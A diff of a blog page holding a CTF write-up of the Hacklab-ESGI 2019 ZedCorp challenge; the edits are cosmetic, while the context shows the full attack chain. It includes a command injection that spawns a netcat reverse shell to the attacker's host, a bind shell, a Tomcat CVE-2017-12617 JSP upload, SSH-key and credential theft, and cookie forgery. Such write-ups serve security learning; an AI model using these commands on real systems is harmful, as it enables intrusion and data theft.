@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.62.0" />
+<meta name="generator" content="Hugo 0.72.0" />
 
   <meta property="og:title" content="[CTF - Hacklab-ESGI-2019] ZedCorp Challenge - My name is Rookie" />
 <meta property="og:description" content="" />
@@ -37,6 +37,7 @@
   <link href="//use.fontawesome.com/releases/v5.6.3/css/all.css" rel="stylesheet">
   <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
   <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
@@ -105,17 +106,17 @@
     <h1 class="brand-title">Thibaud Robin</h1>
     <h2 class="brand-tagline">Alias Th1b4ud</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity, technology and much more !</p>
+    <p>Personnal blog to speak about cybersecurity and Root-Me FAQ</p>
 
     <nav class="nav">
       <ul class="nav-list">
-        <li class="nav-item"><span class="nav-item-separator">//</span><a href="/">Home</a></li>
+        <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/">Home</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/whoami">WHOAMI</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/whoami">WHOAMI</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/writeups">WRITEUPS</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/writeups">WRITEUPS</a></li>
         
-          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/articles">ARTICLES</a></li>
+          <li class="nav-item"><span class="nav-item-separator"> | </span><a href="/articles">ARTICLES</a></li>
         
       </ul>
     </nav>
@@ -176,9 +177,9 @@
     </li>
     <li><a href="#step-7--rce-on-project-server">Step 7 : RCE on project-server</a></li>
     <li><a href="#step-8--bash-history-permission-mistake">Step 8 : Bash history permission mistake</a></li>
-    <li><a href="#step-9--access-to-admin-servers-ftp-service">Step 9 : Access to admin-server's FTP service</a></li>
-    <li><a href="#step-10--access-to-admin-servers-admin-platform">Step 10 : Access to admin-server's admin platform</a></li>
-    <li><a href="#step-11--access-to-ceos-session">Step 11 : Access to CEO's session</a></li>
+    <li><a href="#step-9--access-to-admin-servers-ftp-service">Step 9 : Access to admin-server&rsquo;s FTP service</a></li>
+    <li><a href="#step-10--access-to-admin-servers-admin-platform">Step 10 : Access to admin-server&rsquo;s admin platform</a></li>
+    <li><a href="#step-11--access-to-ceos-session">Step 11 : Access to CEO&rsquo;s session</a></li>
     <li><a href="#step-12--download-confidential-projects">Step 12 : Download confidential projects</a></li>
   </ul>
 </nav>
@@ -229,7 +230,7 @@
 <p>We already have the following information :</p>
 <pre><code>http = ctf.hacklab-esgi.org:5008 
 ssh = ctf.hacklab-esgi.org:5007
-</code></pre><p>First thing to do is to collect some informations about the target. Let's launch a port scan.</p>
+</code></pre><p>First thing to do is to collect some informations about the target. Let&rsquo;s launch a port scan.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ sudo nmap -v -A -O -sT 192.168.122.22
 
 Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-03-21 16:22 CET
@@ -242,7 +243,7 @@ PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
 | ssh-hostkey: 
     <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">(</span><span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span><span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
 |_http-server-header: Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
 |_http-title: <span style="color:#ae81ff">403</span> Forbidden
 </code></pre></div><p>The scan return severals informations :</p>
@@ -258,7 +259,7 @@ PORT   STATE SERVICE VERSION
 <p>All others ports are closed.</p>
 </li>
 </ul>
-<p>Nmap return <code>http-title: 403 Forbidden</code> which could indicate that the web server is under WAF or something else who block request from nmap useragent. Let's check.</p>
+<p>Nmap return <code>http-title: 403 Forbidden</code> which could indicate that the web server is under WAF or something else who block request from nmap useragent. Let&rsquo;s check.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ wafw00f 192.168.122.22 
 
                                  ^     ^
@@ -300,7 +301,7 @@ Number of requests: <span style="color:#ae81ff">11</span>
 <p>The website have a <code>robots.txt</code> with the same directory and some others.</p>
 <p><img src="/img/hacklab-esgi-2019/2.png" alt="robots.txt"></p>
 <h2 id="step-2--credentials-in-logs">Step 2 : Credentials in logs</h2>
-<p>There is no interesting informations in all others directory. Let's check the content of <code>/logs</code> directory</p>
+<p>There is no interesting informations in all others directory. Let&rsquo;s check the content of <code>/logs</code> directory</p>
 <p><img src="/img/hacklab-esgi-2019/3.png" alt="logs"></p>
 <p>Humm ! They are some access logs ! Maybe they come from of the webserver.</p>
 <p><img src="/img/hacklab-esgi-2019/4.png" alt=""></p>
@@ -319,7 +320,7 @@ Number of requests: <span style="color:#ae81ff">11</span>
 <p>If we look closer to <code>/logs</code> directory, we see an other type of logs : <code>/logs/access-details.log</code>. This is access log provided by the WAF ModSecurity.</p>
 <p><img src="/img/hacklab-esgi-2019/7.png" alt=""></p>
 <p>The particularity of this access log is it write the full HTTP request submitted to the webserver (and not only the url like classic access log). So we can have some informations like request data or cookie.</p>
-<p>At the start of the file we see a HTTP POST request on <code>/login.php</code> file with credentials <code>test:test</code> but they don't work on the login page. Let's search deeper.</p>
+<p>At the start of the file we see a HTTP POST request on <code>/login.php</code> file with credentials <code>test:test</code> but they don&rsquo;t work on the login page. Let&rsquo;s search deeper.</p>
 <p>Here is all credentials submitted to <code>/login.php</code> in this log page</p>
 <pre><code>username=test&amp;password=test
 username=admin&amp;password=admin
@@ -333,12 +334,12 @@ username=admin&amp;password=pxrAW7a4HNMBw86bc
 <h2 id="step-4--rce-on-dev-server">Step 4 : RCE on dev-server</h2>
 <p><code>access.log</code> seems to be a file system. We know server is a Debian OS based on Linux. We can try to display others files like <code>/etc/passwd</code>.</p>
 <p><img src="/img/hacklab-esgi-2019/11.png" alt=""></p>
-<p>Nice it's work ! Let's do some fuzzing.</p>
+<p>Nice it&rsquo;s work ! Let&rsquo;s do some fuzzing.</p>
 <p><img src="/img/hacklab-esgi-2019/12.png" alt=""></p>
-<p>Some protections are on. But strange, we are not blocked by the ModSecurity. Maybe the developper deactived it to not be annoyed in developpment. Let's fuzz harder.</p>
+<p>Some protections are on. But strange, we are not blocked by the ModSecurity. Maybe the developper deactived it to not be annoyed in developpment. Let&rsquo;s fuzz harder.</p>
 <p><img src="/img/hacklab-esgi-2019/13.png" alt=""></p>
 <p>Oh ! Look at it ! Developper use shell function to read the access log ! We have a command injection. Nice :D</p>
-<p>Let's get a reverse shell.</p>
+<p>Let&rsquo;s get a reverse shell.</p>
 <p>Injection : <code>access.log &amp;&amp; nc -e /bin/bash 192.168.122.1 4444</code></p>
 <p><img src="/img/hacklab-esgi-2019/14.png" alt=""></p>
 <p>Nice <code>nc</code> is installed. IZI pwn :D</p>
@@ -396,7 +397,7 @@ iface enp7s0 inet static
 </li>
 </ul>
 <p>So we need to have a better access to the <code>dev-server</code> if we want to go deeper in the internal network.</p>
-<p>What is the user <code>test</code> seen in <code>/etc/passwd</code> ? Deactivate account. Weird. Let's check is own home (if we can).</p>
+<p>What is the user <code>test</code> seen in <code>/etc/passwd</code> ? Deactivate account. Weird. Let&rsquo;s check is own home (if we can).</p>
 <pre><code>www-data@dev-server:/home/test$ ls -al
 
 total 28
@@ -408,7 +409,7 @@ drwxr-xr-x 4 test test 4096 Mar 18 15:20 ..
 -rwxr-xr-x 1 test test  675 Mar 10 23:07 .profile
 drwxr-xr-x 2 test test 4096 Mar 10 23:16 .ssh
 </code></pre><p>Ho, <code>.ssh</code> folder. And look at this rights. The user may have done something like <code>chmod 755 *</code> because we can read the file <code>.bash_history</code>. Or maybe <code>chmod -R 755 *</code> ? What a bad practice&hellip;</p>
-<p>Let's check <code>.ssh</code> directory.</p>
+<p>Let&rsquo;s check <code>.ssh</code> directory.</p>
 <pre><code>www-data@dev-server:/home/test/.ssh$ ls -al
 
 total 20
@@ -450,7 +451,7 @@ zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
 </code></pre><p>Perfect ! We have our access.</p>
 <h2 id="step-6--internal-network-discovery">Step 6 : Internal network discovery</h2>
 <p><img src="/img/hacklab-esgi-2019/17.png" alt=""></p>
-<p>As we saw in <code>/etc/passwd</code> the user <code>test</code> have <code>/usr/sbin/nologin</code> as shell. It means that user <code>test</code> can't have a shell on the server. But you can do a SSH tunnel without shell. With this technique you will be able to reach the internal network.</p>
+<p>As we saw in <code>/etc/passwd</code> the user <code>test</code> have <code>/usr/sbin/nologin</code> as shell. It means that user <code>test</code> can&rsquo;t have a shell on the server. But you can do a SSH tunnel without shell. With this technique you will be able to reach the internal network.</p>
 <p>You can use this command to do a dynamic SSH tunnel : <code>ssh -D 9050 test@192.168.122.22 -i id_rsa -N</code></p>
 <p>You can check that tunnel is correclty launched with netstat (or ss) command</p>
 <pre><code>[th1b4ud@th1b4ud-pc]$ sudo netstat -ntpl
@@ -496,9 +497,9 @@ Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
 <li>SSH in port 22</li>
 <li>Web server in port 80</li>
 </ul>
-<p>The web server is a Nginx. It's protected by BasicAuth. We need to find credentials.</p>
+<p>The web server is a Nginx. It&rsquo;s protected by BasicAuth. We need to find credentials.</p>
 <p><img src="/img/hacklab-esgi-2019/19.png" alt=""></p>
-<p>The FTP server is a VSFTPd. It's also protected by login (anynmous login is not available). Need to find credentials too.</p>
+<p>The FTP server is a VSFTPd. It&rsquo;s also protected by login (anynmous login is not available). Need to find credentials too.</p>
 <pre><code>[th1b4ud@th1b4ud-pc]$ proxychains -q ftp 10.0.0.3
 
 Connected to 10.0.0.3.
@@ -518,7 +519,7 @@ ftp&gt;
 <h2 id="step-7--rce-on-project-server">Step 7 : RCE on project-server</h2>
 <p>What is AJP ?</p>
 <p>&ldquo;<em>AJP Connectors work in the same way as HTTP Connectors, but they use the AJP protocol in place of HTTP. Apache JServ Protocol, or AJP, is an optimized binary version of HTTP that is typically used to allow Tomcat to communicate with an Apache web server.</em>&rdquo;</p>
-<p>Humm Apache Tomcat ? 8009 and 8080 ? There are defaults ports on Apache Tomcat. Maybe there is a vulnerability to exploit. Let's check the web server.</p>
+<p>Humm Apache Tomcat ? 8009 and 8080 ? There are defaults ports on Apache Tomcat. Maybe there is a vulnerability to exploit. Let&rsquo;s check the web server.</p>
 <p><img src="/img/hacklab-esgi-2019/20.png" alt=""></p>
 <p>Ok so this server is used to manage all projects of the company. There is some interesting tasks on this kanban application.</p>
 <ul>
@@ -526,17 +527,17 @@ ftp&gt;
 <li>The CEO session in admin platform need more functionnality.</li>
 <li>It may remain some sensible informations on project-server (maybe on users home).</li>
 </ul>
-<p>So let's search deeper.</p>
-<p>We know that application is running with Apache Tomcat. But what is the version ? By default, it's really simple to know it. It's displayed on error pages.</p>
+<p>So let&rsquo;s search deeper.</p>
+<p>We know that application is running with Apache Tomcat. But what is the version ? By default, it&rsquo;s really simple to know it. It&rsquo;s displayed on error pages.</p>
 <p><img src="/img/hacklab-esgi-2019/21.png" alt=""></p>
 <p>Yeah ! Got it !</p>
 <p>The information is also available on <code>/docs</code></p>
 <p><img src="/img/hacklab-esgi-2019/22.png" alt=""></p>
-<p>Let's check the version on exploitdb with tool <code>searchsploit</code></p>
+<p>Let&rsquo;s check the version on exploitdb with tool <code>searchsploit</code></p>
 <p><img src="/img/hacklab-esgi-2019/23.png" alt=""></p>
-<p>Ho JSP Bypass Upload. Let's check the exploit : CVE 2017-12617 : <a href="https://www.exploit-db.com/exploits/">https://www.exploit-db.com/exploits/</a></p>
-<p>So the exploit is a simple PUT request. Tomcat will receive and write the requested data on the server. Let's try to obtain a reverse shell.</p>
-<p>First we need to find free filename. Here the filename <code>exploit.jsp</code> is free. Let's use
+<p>Ho JSP Bypass Upload. Let&rsquo;s check the exploit : CVE 2017-12617 : <a href="https://www.exploit-db.com/exploits/">https://www.exploit-db.com/exploits/</a></p>
+<p>So the exploit is a simple PUT request. Tomcat will receive and write the requested data on the server. Let&rsquo;s try to obtain a reverse shell.</p>
+<p>First we need to find free filename. Here the filename <code>exploit.jsp</code> is free. Let&rsquo;s use
 it.</p>
 <p><img src="/img/hacklab-esgi-2019/24.png" alt=""></p>
 <p>HTTP payload</p>
@@ -570,13 +571,13 @@ Content-Length: 4
 <p>YEAH ! 201 CREATED !</p>
 <p><img src="/img/hacklab-esgi-2019/26.png" alt=""></p>
 <p>We are in !</p>
-<p>Let's obtain a bind shell (reverse shell are particulary complicated when there is several proxys)</p>
+<p>Let&rsquo;s obtain a bind shell (reverse shell are particulary complicated when there is several proxys)</p>
 <p>Payload : <code>nc -vlp 5555 -e /bin/bash</code></p>
 <p><img src="/img/hacklab-esgi-2019/28.png" alt=""></p>
 <p>Connect to it : <code>proxychains -q nc 10.0.0.2 5555</code></p>
 <p><img src="/img/hacklab-esgi-2019/27.png" alt=""></p>
 <h2 id="step-8--bash-history-permission-mistake">Step 8 : Bash history permission mistake</h2>
-<p>Let's check some classic files</p>
+<p>Let&rsquo;s check some classic files</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@project-server:/home$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -630,8 +631,8 @@ tomcat@project-server:/home$ cat /etc/resolv.conf
 cat /etc/resolv.conf
 search zedcorp
 nameserver 10.0.0.1
-</code></pre></div><p>We have new users of ZedCorp company. Let's check their home.</p>
-<p>Let's check user home like the kanbans task said.</p>
+</code></pre></div><p>We have new users of ZedCorp company. Let&rsquo;s check their home.</p>
+<p>Let&rsquo;s check user home like the kanbans task said.</p>
 <pre><code>tomcat@project-server:/$ cd /home
 cd /home
 
@@ -763,7 +764,7 @@ exit
 <li>Documents encrpted with openssl and password : <code>daniel2019</code></li>
 </ul>
 <p>Next step : admin-server pwn</p>
-<p>Don't forget to remove your backdoor (and nothing else bad h4x0r) :p</p>
+<p>Don&rsquo;t forget to remove your backdoor (and nothing else bad h4x0r) :p</p>
 <pre><code>tomcat@project-server:/home$ cd /opt/tomcat/webapps/ROOT/
 tomcat@project-server:~/webapps/ROOT$ rm exploit.jsp
 rm exploit.jsp
@@ -776,7 +777,7 @@ drwxr-xr-x 7 root   root    4096 mars  20 11:03 ..
 -rw-r--r-- 1 root   root    4849 mars  21 15:49 index.html
 -rw-r--r-- 1 root   root    6284 mars  18 17:16 kanban.css
 -rw-r--r-- 1 root   root   18191 mars  18 17:16 kanban.js
-</code></pre><h2 id="step-9--access-to-admin-servers-ftp-service">Step 9 : Access to admin-server's FTP service</h2>
+</code></pre><h2 id="step-9--access-to-admin-servers-ftp-service">Step 9 : Access to admin-server&rsquo;s FTP service</h2>
 <p><img src="/img/hacklab-esgi-2019/29.png" alt=""></p>
 <p>You can download the file <code>credentials.tar.gz</code> with the command <code>get credentials.tar.gz</code></p>
 <p>Decrypt it</p>
@@ -800,23 +801,23 @@ CREDENTIALS
 
 - CEO Privileged test account on http://admin-server:80
     + Username : ceo
-</code></pre><p>So sweet ! It's the backup of the administrator's passwords. We can now access to admin platform on admin-server.</p>
-<h2 id="step-10--access-to-admin-servers-admin-platform">Step 10 : Access to admin-server's admin platform</h2>
+</code></pre><p>So sweet ! It&rsquo;s the backup of the administrator&rsquo;s passwords. We can now access to admin platform on admin-server.</p>
+<h2 id="step-10--access-to-admin-servers-admin-platform">Step 10 : Access to admin-server&rsquo;s admin platform</h2>
 <p>With credentials <code>admin:zedc0rp2019!</code> we can access to the website.</p>
 <p><img src="/img/hacklab-esgi-2019/30.png" alt=""></p>
-<p>Let's try to login with simple test account : <code>user:user-zedcorp-2019</code></p>
+<p>Let&rsquo;s try to login with simple test account : <code>user:user-zedcorp-2019</code></p>
 <p><img src="/img/hacklab-esgi-2019/31.png" alt=""></p>
 <p>With privileged test account : <code>admin:admin-zedcorp-2019</code></p>
 <p><img src="/img/hacklab-esgi-2019/32.png" alt=""></p>
 <p>And with ceo account with unknow password</p>
 <p><img src="/img/hacklab-esgi-2019/33.png" alt=""></p>
-<p>Interesting. Let's check document upload functionnality.</p>
+<p>Interesting. Let&rsquo;s check document upload functionnality.</p>
 <p><img src="/img/hacklab-esgi-2019/34.png" alt=""></p>
 <p>Bruh ! Not working :(</p>
-<h2 id="step-11--access-to-ceos-session">Step 11 : Access to CEO's session</h2>
-<p>Let's check requests captured by burp.</p>
+<h2 id="step-11--access-to-ceos-session">Step 11 : Access to CEO&rsquo;s session</h2>
+<p>Let&rsquo;s check requests captured by burp.</p>
 <p><img src="/img/hacklab-esgi-2019/35.png" alt=""></p>
-<p>There is some cookies. Look at this strange cookie <code>status</code>. He has the value <code>admin</code> encoded in base64. Do you think the application check user status with this status ? Let's check with <code>ceo</code>.</p>
+<p>There is some cookies. Look at this strange cookie <code>status</code>. He has the value <code>admin</code> encoded in base64. Do you think the application check user status with this status ? Let&rsquo;s check with <code>ceo</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;YWRtaW4=&#34;</span> | base64 -d
 admin
 <span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo -n <span style="color:#e6db74">&#34;ceo&#34;</span> | base64
